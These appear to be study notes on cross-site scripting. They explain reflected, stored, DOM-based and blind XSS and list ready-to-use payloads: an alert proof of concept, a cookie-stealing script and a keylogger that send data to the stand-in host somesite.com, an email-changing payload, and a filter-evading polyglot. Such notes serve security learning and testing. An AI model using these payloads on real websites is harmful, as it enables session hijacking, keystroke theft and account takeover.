# Basic-XSS

## Proof Of Concept:
### Simplest of payloads - demonstrate that you can achieve XSS on a website. Done by causing an alert box to pop up on the page eg:

 `<script>alert('XSS');</script>`
 
 
## Session Stealing:

### Details of a user's session, are often kept in cookies on the targets machine. The below code takes the target's cookie, base64 encodes the cookie to ensure  transmission and then posts it to a website under the hacker's control to be logged. Hacker can then take over the target's session and be logged as that  user.

`<script>fetch('https://somesite.com/steal?cookie=' + btoa(document.cookie));</script>`


## Key Logger:
`<script>document.onkeypress = function(e) { fetch('https://somesite.com/log?key=' + btoa(e.key) );}</script>`


## Business Logic:

### This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:

`<script>user.changeEmail('attacker@hacker.com');</script>`

---


# Reflected XSS

### This happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

## Check for reflected XSS in:
1. Parameters in the URL Query String
2. URL File Path
3. Sometimes HTTP Headers (although unlikely exploitable in practice)

---

# Stored XSS

### XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.
### The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

## Check for stored XSS where it seems data is stored and then shown back in areas that other users have access to eg:

1. Comments on a blog
2. User profile information
3. Website Listings

---

# DOM Based XSS

### JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction. Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

---

# Blind XSS

### Payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

### When testing for Blind XSS vulnerabilities,  need to ensure payload has a call back (usually an HTTP request)- can tell if code is being executed.

---
# Polyglot
### String of text which can escape attributes, tags and bypass filters all in one eg:

`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('popup') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e`


